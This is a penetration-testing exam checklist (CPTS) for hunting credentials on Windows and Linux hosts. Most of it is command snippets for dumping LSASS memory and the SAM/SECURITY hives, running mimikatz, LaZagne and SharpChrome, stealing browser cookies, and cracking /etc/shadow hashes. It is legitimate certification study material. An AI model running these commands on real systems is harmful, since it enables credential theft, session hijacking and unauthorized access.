# CPTS Pillaging Checklist — Windows & Linux

> **Purpose:** Exam-time credential pillaging checklist derived from the main `CPTS_Notes` material. Use it to systematically look for plaintext credentials, stored credentials, hashes, tickets, keys, application secrets, and files that can lead to credential recovery or reuse.
>
> **Scope:** Main CPTS notes only. `Extra/` / `Extras/` are excluded. The AI-generated checklist files are not treated as the primary source. Tools below are limited to tools already represented in the notes.
>
> **Exam mindset:** **Find → Identify → Extract/Decrypt → Validate → Reuse → Re-enumerate.** A recovered secret is usually more valuable than spending time on a speculative exploit.

---

# 0. Thirty-second pillaging reset

- [ ] **What access do I currently have?**
  - Network only → look for exposed files/services that disclose credentials.
  - Normal user → inspect user/application stores and readable configuration files.
  - Local admin / SYSTEM / root → inspect protected credential stores, hashes, memory, backups and domain material.
- [ ] **What operating system am I on?** → choose the Windows or Linux branch.
- [ ] **Which users/services/apps are present?** → use this to decide whose files and which application stores matter.
- [ ] **What new credential material did I just find?**
  - Plaintext password → authenticate directly.
  - Hash → identify/crack or use an accepted hash-authentication path where applicable.
  - DPAPI-protected material → locate the corresponding user/master-key material.
  - Browser/session credential → use the corresponding application/session path.
  - SSH key → test SSH access.
- [ ] **After every new credential:** test it against the most relevant already-discovered access paths (SMB/RDP/WinRM/SSH/SQL/web/AD) and then re-enumerate.

---

# 1. Windows Pillaging Checklist

## 1.1 User account and local identity information

- [ ] Enumerate local users and account metadata.
  - **Command:** `Get-LocalUser`
  - **Check:** `Description`, account state and unusual service/admin accounts.
  - **Condition → outcome:** password/secret in description → plaintext credential.
- [ ] Inspect computer/OS description.
  - **Command:** `Get-WmiObject -Class Win32_OperatingSystem | select Description`
  - **Check:** descriptions containing operational hints, usernames, passwords or internal naming.
  - **Outcome:** possible credential or targeting clue.
- [ ] Review current identity before interpreting any protected store.
  - **Commands:** `whoami`, `whoami /all`
  - **Check:** current user, groups and privileges.

---

## 1.2 Search local files for plaintext credentials

### High-value file types from the notes

- [ ] Search for:
  - `*.txt`
  - `*.ini`
  - `*.cfg`
  - `*.config`
  - `*.xml`
- [ ] Also search for credential-bearing application files explicitly called out in the notes:
  - `*.rdp`
  - `*.vnc`
  - `*.cred`
- [ ] Search for credential keywords.
  - `password`
  - `pass`
  - `admin`
  - `cred`

### Commands from the notes

```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```

```powershell
Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
```

```powershell
dir /S /B C:\*password*
```

```powershell
where /R C:\ *.config
```

```powershell
Get-ChildItem C:\ -Recurse -Include *.txt,*.ini,*.cfg,*.config,*.xml -ErrorAction Ignore |
    Select-String -Pattern 'password|pass|admin|cred'
```

- [ ] **Condition → outcome:** readable config/script/file contains username + password → authenticate to the relevant service.
- [ ] **Condition → outcome:** config contains a connection string → identify database/service and test the recovered account there.
- [ ] **Condition → outcome:** `.rdp` / `.vnc` / credential-related file exists → inspect it for saved connection/authentication material.

---

## 1.3 Unattended installation and deployment artifacts

- [ ] Search for `Unattend.xml` / unattended-installation files.
- [ ] Look for:
  - AutoLogon settings
  - usernames
  - passwords
  - deployment/service account credentials
- [ ] Search custom dictionary/password files mentioned by the notes.
- [ ] **Condition → outcome:** unattended installation contains an AutoLogon password → plaintext credential / local account access.

---

## 1.4 PowerShell command history

### Primary location

```text
C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

### Commands

```powershell
(Get-PSReadLineOption).HistorySavePath
```

```powershell
gc (Get-PSReadLineOption).HistorySavePath
```

```powershell
Get-ChildItem C:\Users -Directory | ForEach-Object {
    $p = "C:\Users\$($_.Name)\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    if (Test-Path $p) { Write-Host "=== $p ==="; Get-Content $p }
}
```

- [ ] **Check for:** passwords typed into commands, connection strings, API tokens, administrative commands, download URLs, mounted shares, database commands.
- [ ] **Condition → outcome:** command history contains a secret → replay/reuse the credential or recover the target/application context.
- [ ] **Important:** inspect other users' history when the current privilege allows it.

---

## 1.5 DPAPI — requested `Protect` and `Credential` paths

### User DPAPI master-key path

```text
C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Protect\<SID>\
```

- [ ] Check the `Protect` directory for DPAPI master-key material.
- [ ] **Meaning:** these files are the per-user DPAPI master-key material used to protect other Windows secrets.

### Credential blobs — Roaming path

```text
C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Credentials\
```

- [ ] Check for credential blobs stored under the requested Roaming path.

### Credential blobs — Local path also used by Windows

```text
C:\Users\<USERNAME>\AppData\Local\Microsoft\Credentials\
```

- [ ] Check both `Roaming\Microsoft\Credentials` and `Local\Microsoft\Credentials` when accessible.
- [ ] **Condition → outcome:** DPAPI master keys + corresponding protected credential blob are available under an accessible user context → DPAPI decryption path.

### Commands / techniques represented by the notes

For PowerShell `Export-Clixml` credential objects:

```powershell
Import-Clixml .\credential.xml
```

```powershell
$cred = Import-Clixml .\credential.xml
$cred.GetNetworkCredential().Password
```

- [ ] **Condition → outcome:** readable `Export-Clixml` credential file + appropriate user/master-key context → recover plaintext password.
- [ ] `mimikatz` is present in the notes for Windows credential handling; use its DPAPI functionality when the corresponding master-key/blob prerequisites are satisfied.

> **Exam note:** Finding a DPAPI blob alone does **not** mean it is immediately decryptable. Think: **blob → correct user/SID → master key → decryption context → plaintext secret**.

---

## 1.6 Credential Manager / saved credentials

- [ ] Check stored Windows credentials.

```cmd
cmdkey /list
```

- [ ] Look for saved RDP / network credentials and target names.
- [ ] Check for applications using `runas /savecred`.

```cmd
runas /savecred /user:<USER> cmd
```

- [ ] `mimikatz` credential-manager functionality is covered by the notes.
- [ ] **Condition → outcome:** saved credential exists and is usable for a relevant target → authenticated access without knowing the original password.

> **Note:** the source note contains a typo as `cmdket`; the correct Windows command is `cmdkey`.

---

## 1.7 Browser credentials and browser session material

### Chrome-family stored credentials

- [ ] Run the note's `SharpChrome` path when present.

```powershell
.\SharpChrome.exe logins /unprotect
```

- [ ] **Condition → outcome:** browser login store can be decrypted in the current context → saved website username/passwords.

### Firefox cookies

- [ ] Locate Firefox profile databases.

```powershell
copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```

- [ ] Use the note's `cookieextractor.py` workflow against the database when appropriate.
- [ ] Example from the notes:

```bash
python3 cookieextractor.py --dbpath <cookies.sqlite> --host slack --cookie d
```

- [ ] **Condition → outcome:** valid session cookie → authenticated web session without needing the plaintext password.

### Generic browser credential sweep

- [ ] Run the note's:

```powershell
.\LaZagne.exe all
```

- [ ] **Outcome:** saved application/browser credentials where supported by LaZagne.

---

## 1.8 Application/session credential stores

- [ ] Search installed applications first.
  - Installed applications may indicate where credential stores, configuration files and databases are likely to exist.
- [ ] Installed application inventory from the notes:

```powershell
$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
    Select-Object DisplayName,DisplayVersion,InstallLocation
$INSTALLED | Format-Table -AutoSize
```

- [ ] Repeat against the `Wow6432Node` uninstall location when relevant.
- [ ] Use `SessionGopher` when the notes' session-hunting path applies.
- [ ] **Condition → outcome:** application stores sessions/credentials locally → extract credentials or reusable session information.

---

## 1.9 PuTTY saved sessions

### Registry location

```text
HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
```

- [ ] Inspect saved PuTTY sessions.
- [ ] Pay special attention to proxy-related values such as:
  - `ProxyUsername`
  - `ProxyPassword`
- [ ] **Condition → outcome:** recoverable saved credential → SSH/proxy access or credential reuse.

### Command

```cmd
reg query "HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions" /s
```

---

## 1.10 Windows AutoLogon credentials

### Registry location

```text
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
```

### Command

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

- [ ] Check for AutoAdminLogon / default user / default password style values.
- [ ] **Condition → outcome:** stored autologon password → plaintext local/domain credential.

---

## 1.11 SAM / SYSTEM / SECURITY registry hives

### Hive locations / acquisition path from the notes

```cmd
reg.exe save hklm\sam C:\Windows\Temp\sam
reg.exe save hklm\system C:\Windows\Temp\system
reg.exe save hklm\security C:\Windows\Temp\security
```

- [ ] Transfer the acquired hives for offline parsing when the privilege condition permits.
- [ ] Parse with the note's Impacket / `secretsdump` workflow:

```bash
impacket-secretsdump -sam sam -security security -system system LOCAL
```

- [ ] Isolate recovered NTLM hashes and crack as appropriate.
- [ ] The notes reference Hashcat mode **1000** for NTLM.
- [ ] Alternatively, where the note's remote/local extraction path applies:

```bash
nxc smb <IP> -u <USER> -p <PASSWORD> --sam
```

- [ ] **Condition → outcome:** SAM material readable → local account NTLM hashes → password cracking / hash-based reuse.
- [ ] **Condition → outcome:** SECURITY / LSA material readable → LSA secrets → service/application credentials and other secrets.

---

## 1.12 LSA secrets

- [ ] With the appropriate privileged context, use the note's `mimikatz` workflow:

```text
privilege::debug
lsadump::secrets
```

- [ ] Or use NetExec's LSA extraction path where applicable:

```bash
nxc smb <IP> -u <USER> -p <PASSWORD> --lsa
```

- [ ] **Condition → outcome:** LSA secrets recovered → service-account / stored application credentials.

---

## 1.13 LSASS memory / credential material

### Identify LSASS

```cmd
tasklist /svc
```

```powershell
Get-Process lsass
```

### Note-supported dump approach

```cmd
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> <PATH> full
```

- [ ] Parse the resulting dump with `pypykatz`.

```bash
pypykatz lsa minidump <dumpfile>
```

- [ ] `mimikatz` can also operate on an LSASS minidump using the workflow in the notes.
- [ ] **Condition → outcome:** LSASS material successfully parsed → NTLM hashes / credential material / session information.

> **Exam rule:** do not jump into LSASS dumping first when a plaintext credential, DPAPI object, saved credential, or readable configuration is already available.

---

## 1.14 Interesting Windows filesystem artifacts

Search or inspect the following note-listed locations when access permits:

```text
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
```

- [ ] **Check:** passwords, usernames, internal hosts, software/deployment credentials, old configuration and cached connection information.
- [ ] **Condition → outcome:** readable artifact contains secret material → validate and reuse.

---

## 1.15 Shares and domain-connected file hunting

- [ ] Search accessible network shares for:
  - scripts
  - backups
  - configuration files
  - documents
  - deployment files
  - password files
  - database connection strings
- [ ] `Snaffler.exe -s`
  - **Outcome:** interesting files / credential candidates on domain-connected systems.
- [ ] `PowerHuntShares` / `Invoke-HuntSMBShares`

```powershell
Invoke-HuntSMBShares -Threads <ThreadCount> -OutputDirectory C:\Users\Public
```

- [ ] **Condition → outcome:** credential-bearing share file → stronger account / service credential / lateral movement.

---

## 1.16 Backups and virtual disks

- [ ] Look for:
  - VHD / VHDX / VMDK
  - offline backups
  - old system images
  - copied registry hives
- [ ] Windows note path:
  - `Mount-VHD` where supported.
- [ ] Linux-side offline inspection of Windows disk images:

```bash
guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
```

```bash
guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1
```

- [ ] **Condition → outcome:** readable old system image contains SAM/SYSTEM/SECURITY, profiles or config files → offline credential recovery.

---

## 1.17 Windows pillaging priority order when tired

```text
START
  |
  +--> User descriptions / obvious plaintext files
  |
  +--> Unattend.xml / config / scripts / .rdp / .vnc / .cred
  |
  +--> PowerShell history
  |
  +--> cmdkey / Winlogon / PuTTY saved sessions
  |
  +--> Browser credentials / cookies / LaZagne / SessionGopher
  |
  +--> Shares / Snaffler / PowerHuntShares
  |
  +--> DPAPI Protect + Credentials / Export-Clixml
  |
  +--> SAM / SYSTEM / SECURITY / LSA secrets
  |
  +--> LSASS dump / pypykatz / mimikatz
  |
  +--> Backups / VHDX / VMDK
  |
  `--> Re-enumerate with every recovered identity
```

---

# 2. Linux Pillaging Checklist

## 2.1 Immediate shell/user context

- [ ] Identify current user and groups.

```bash
id
whoami
groups
```

- [ ] **Check:** privileged groups, service identities, unusual memberships.
- [ ] Identify the home directories you can read.
- [ ] **Condition → outcome:** stronger user's readable home directory → inspect history, SSH keys and application configuration.

---

## 2.2 Search configuration / text files for passwords

The notes use a generic recursive filename-extension + keyword-search workflow.

- [ ] Pick a likely credential-bearing extension relevant to the application/configuration under investigation.
- [ ] Recursively locate matching files.
- [ ] Pipe into keyword search for:
  - `password`
  - `pass`
  - `admin`
  - `cred`
- [ ] **Condition → outcome:** plaintext credential in configuration/script → authenticate to the associated application/service.
- [ ] **Condition → outcome:** database connection string → database access / application pivot.

### Generic note-style pattern

```bash
find / -name '*.<EXT>' 2>/dev/null | xargs grep -iE 'password|pass|admin|cred' 2>/dev/null
```

> Use the actual extension relevant to the application. The notes deliberately present this as a generic pattern rather than a fixed single extension.

---

## 2.3 Shell history

### Note-supported check

```bash
tail -n5 /home/*/.bash*
```

- [ ] Inspect:
  - `.bash_history`
  - `.bashrc`
  - other `.bash*` files that are readable
- [ ] Look for:
  - passwords supplied to commands
  - SSH commands
  - database credentials
  - API keys/tokens
  - administrative commands
  - mounted shares and remote hosts
- [ ] **Condition → outcome:** credential in shell history → direct credential reuse.

---

## 2.4 `/etc/passwd` + `/etc/shadow`

- [ ] Check whether `/etc/passwd` is readable.
- [ ] Check whether `/etc/shadow` is readable.
- [ ] **Condition → outcome:** readable shadow hashes → offline password cracking.

### Combine for John

```bash
unshadow /etc/passwd /etc/shadow > hashes.txt
```

### Crack with Hashcat

```bash
hashcat -m 1800 hashes.txt <wordlist>
```

- [ ] **Outcome:** recovered Linux account passwords → SSH / local / application credential reuse.

> The mode `1800` is the mode represented in the notes for the SHA-512 crypt family encountered in the Linux password extraction workflow.

---

## 2.5 Linux application credential hunting

- [ ] Search application directories and user homes for configuration files.
- [ ] Prioritize files that contain:
  - database connection strings
  - service usernames/passwords
  - API tokens
  - SSH private keys
  - deployment credentials
  - backup credentials
- [ ] **Condition → outcome:** application config contains reusable credential → authenticate to the corresponding service/database/host.

---

## 2.6 `minipenguin.py`

- [ ] When present/available in the notes' workflow, run:

```bash
sudo python3 minipenguin.py
```

- [ ] **Purpose:** credential/environment discovery on the Linux host.
- [ ] **Outcome:** locally stored credential or token material useful for reuse.

---

## 2.7 LaZagne on Linux

- [ ] Use the note's Linux credential-hunting workflow:

```bash
sudo python2.7 laZagne.py all
```

- [ ] **Outcome:** credentials stored by supported local applications.
- [ ] Feed recovered credentials into SSH / web / database / other already-discovered authentication paths.

---

## 2.8 Cron as a pillaging source

Cron is not only a privilege-escalation check: its scripts and command lines can reveal credentials, paths and service accounts.

```bash
cat /etc/crontab
```

- [ ] Check scheduled commands for:
  - usernames
  - command-line passwords
  - configuration file paths
  - backup destinations
  - database scripts
  - service account names
- [ ] **Condition → outcome:** cron command/script reveals plaintext credential → reuse credential.
- [ ] **Condition → outcome:** cron references a sensitive configuration file → inspect that file for credentials.

---

## 2.9 SSH keys and key material

- [ ] Inspect readable user home directories for SSH material.
- [ ] High-value locations to check within accessible user homes:

```text
~/.ssh/
```

- [ ] Look for private keys and SSH configuration.
- [ ] **Condition → outcome:** readable private key + matching account/host context → SSH access.
- [ ] Also inspect configuration files referenced by SSH or scripts for usernames/hosts.

---

## 2.10 Environment / process-exposed secrets

- [ ] Inspect application/process execution context when the current shell allows it.
- [ ] Look for:
  - passwords in command lines
  - tokens in environment/configuration
  - service account names
  - database credentials
- [ ] `ps` / process enumeration is part of the broader Linux enumeration workflow.
- [ ] **Condition → outcome:** secret exposed in process/configuration context → credential reuse or application access.

---

## 2.11 Linux pillaging priority order when tired

```text
START
  |
  +--> id / whoami / groups
  |
  +--> /home/*/.bash* history
  |
  +--> Configuration / application files + password keywords
  |
  +--> SSH keys / ~/.ssh
  |
  +--> /etc/passwd + /etc/shadow
  |
  +--> minipenguin.py / LaZagne.py
  |
  +--> /etc/crontab and referenced scripts/configs
  |
  `--> Re-enumerate with every recovered identity
```

---

# 3. Credential type → next action

| Finding | First interpretation | Next action | Expected outcome |
|---|---|---|---|
| Plaintext password | Highest-value simple finding | Validate against relevant service/host | New authenticated access |
| Username + password in config | Service/application credential | Test against corresponding app/DB/remote service | Service access / pivot |
| PowerShell history password | User previously authenticated somewhere | Reuse at the referenced target | Account takeover / lateral access |
| `cmdkey` saved credential | Windows saved authentication | Use the corresponding target/session | Remote access |
| Winlogon AutoLogon password | Stored local/domain credential | Authenticate as that user | Local/remote access |
| PuTTY saved credential | Saved SSH/proxy material | Use SSH/proxy path | SSH / pivot |
| Browser saved password | Web credential | Log in to the relevant web app | Web account access |
| Browser session cookie | Live authenticated session | Reuse session in the intended application | Session access |
| DPAPI `Protect` + credential blob | Encrypted Windows secret | Obtain correct user/master-key context and decrypt | Plaintext credential |
| SAM NTLM hash | Local password hash | Hashcat / hash-based reuse where supported | Local admin/user access |
| LSA secret | Stored Windows service/application secret | Parse and validate | Service/application access |
| LSASS credential material | Active/in-memory Windows credential material | Parse with note-supported tools | NTLM/session credential material |
| `/etc/shadow` hash | Linux account hash | `unshadow` + Hashcat/John | Linux password |
| SSH private key | Direct authentication material | Validate against discovered SSH target/user | Shell access |
| Cron/config secret | Automation/service credential | Inspect referenced file/service | Credential reuse |
| Share file containing credentials | Cross-host secret | Validate against relevant hosts/services | Lateral movement |
| Backup/VHD/VMDK with registry/profile data | Offline credential source | Mount + inspect / parse | Historical/current credential material |

---

# 4. Pillaging command cheat sheet

## Windows — fast commands

```powershell
whoami
whoami /all
Get-LocalUser
Get-WmiObject -Class Win32_OperatingSystem | select Description
(Get-PSReadLineOption).HistorySavePath
gc (Get-PSReadLineOption).HistorySavePath
cmdkey /list
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query "HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions" /s
```

```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```

```powershell
Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
```

```powershell
Get-ChildItem C:\ -Recurse -Include *.txt,*.ini,*.cfg,*.config,*.xml -ErrorAction Ignore |
    Select-String -Pattern 'password|pass|admin|cred'
```

```powershell
.\LaZagne.exe all
```

```powershell
.\SharpChrome.exe logins /unprotect
```

```powershell
Invoke-HuntSMBShares -Threads <ThreadCount> -OutputDirectory C:\Users\Public
```

```cmd
reg.exe save hklm\sam C:\Windows\Temp\sam
reg.exe save hklm\system C:\Windows\Temp\system
reg.exe save hklm\security C:\Windows\Temp\security
```

```cmd
tasklist /svc
```

```powershell
Get-Process lsass
```

```cmd
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> <PATH> full
```

```text
mimikatz:
privilege::debug
lsadump::secrets
```

```bash
impacket-secretsdump -sam sam -security security -system system LOCAL
pypykatz lsa minidump <dumpfile>
nxc smb <IP> -u <USER> -p <PASSWORD> --sam
nxc smb <IP> -u <USER> -p <PASSWORD> --lsa
```

## Linux — fast commands

```bash
id
whoami
groups
tail -n5 /home/*/.bash*
cat /etc/crontab
unshadow /etc/passwd /etc/shadow > hashes.txt
hashcat -m 1800 hashes.txt <wordlist>
sudo python3 minipenguin.py
sudo python2.7 laZagne.py all
```

```bash
find / -name '*.<EXT>' 2>/dev/null | xargs grep -iE 'password|pass|admin|cred' 2>/dev/null
```

---

# 5. Windows DPAPI mini-flow

```text
Credential file / protected blob found
            |
            v
Identify owning USER / SID
            |
            v
Check C:\Users\<USER>\AppData\Roaming\Microsoft\Protect\<SID>\
            |
            v
Check Credential blobs:
  C:\Users\<USER>\AppData\Roaming\Microsoft\Credentials\
  C:\Users\<USER>\AppData\Local\Microsoft\Credentials\
            |
            v
Do I have the correct user/master-key context?
       |                    |
      NO                   YES
       |                    |
       v                    v
Find the missing       Decrypt using the
user/master-key        note-supported DPAPI workflow
       |                    |
       +----------+---------+
                  v
           Plaintext secret
                  |
                  v
      Validate → Reuse → Re-enumerate
```

---

# 6. Unified panic / burnout decision tree

```text
START
  |
  v
WHAT OS?
  |
  +--> WINDOWS
  |      |
  |      +--> Plaintext files / configs / Unattend?
  |      |       `--> PASSWORD
  |      |
  |      +--> PowerShell history?
  |      |       `--> PASSWORD / TARGET
  |      |
  |      +--> cmdkey / Winlogon / PuTTY?
  |      |       `--> SAVED CREDENTIAL
  |      |
  |      +--> Browser / LaZagne / SessionGopher?
  |      |       `--> WEB / APP CREDENTIAL
  |      |
  |      +--> Shares / Snaffler / PowerHuntShares?
  |      |       `--> FILE -> CREDENTIAL
  |      |
  |      +--> DPAPI Protect + Credentials?
  |      |       `--> DECRYPTABLE SECRET (when context exists)
  |      |
  |      +--> SAM / SECURITY / LSASS?
  |      |       `--> HASH / SECRET / SESSION MATERIAL
  |      |
  |      `--> BACKUP / VHD(X) / VMDK?
  |              `--> OFFLINE CREDENTIAL MATERIAL
  |
  `--> LINUX
         |
         +--> /home/*/.bash*?
         |       `--> HISTORY -> PASSWORD
         |
         +--> Config/application files?
         |       `--> PASSWORD / DB STRING / TOKEN
         |
         +--> ~/.ssh/?
         |       `--> PRIVATE KEY
         |
         +--> /etc/passwd + /etc/shadow?
         |       `--> HASH -> CRACK
         |
         +--> minipenguin / LaZagne?
         |       `--> STORED APPLICATION CREDENTIALS
         |
         `--> /etc/crontab / referenced scripts?
                 `--> SECRET / SERVICE ACCOUNT / CONFIG

EVERY TIME A SECRET IS FOUND:
  |
  +--> Identify owner / service
  +--> Validate against the relevant service
  +--> Record the credential immediately
  +--> Re-run enumeration with the new identity
```

---

# 7. Exam rules for pillaging

- **Credentials before exploits.** A usable password or key often creates a faster path than a complex exploit.
- **Read before dumping.** Search plaintext/config/history/browser stores before spending time on protected memory or registry extraction.
- **Do not assume encrypted means useless.** Check whether the application uses DPAPI or another local credential store and whether the required decryption context is available.
- **Treat hashes as credentials.** Identify the hash, crack offline where appropriate, and check whether the resulting password is reused.
- **Every credential needs a destination.** Always ask: *What service, user, host or application does this belong to?*
- **Re-enumerate after every identity change.** A normal user password, local-admin credential, service credential or root shell changes what can be pillaged.
- **Do not keep digging after a deterministic credential is found.** Validate it first.

---

# 8. Source notes used

- [CPTS Notes — PasswordAttack / Credential Hunting](https://github.com/TamHoTsun-Alvin/CPTS_Notes/blob/main/PasswordAttack/Credential%20Hunting.md)
- [CPTS Notes — Extracting Linux Password](https://github.com/TamHoTsun-Alvin/CPTS_Notes/blob/main/PasswordAttack/Extracting%20Linux%20Password.md)
- [CPTS Notes — Extracting Windows Password Hash](https://github.com/TamHoTsun-Alvin/CPTS_Notes/blob/main/PasswordAttack/Extracting%20Windows%20Password%20Hash.md)
- [CPTS Notes — Windows Credential Hunting](https://github.com/TamHoTsun-Alvin/CPTS_Notes/blob/main/Privilege%20Escalation/Windows/Credential%20Hunting%20in%20Windows.md)
- [CPTS Notes — Windows Pillaging](https://github.com/TamHoTsun-Alvin/CPTS_Notes/blob/main/Privilege%20Escalation/Windows/Pillaging.md)

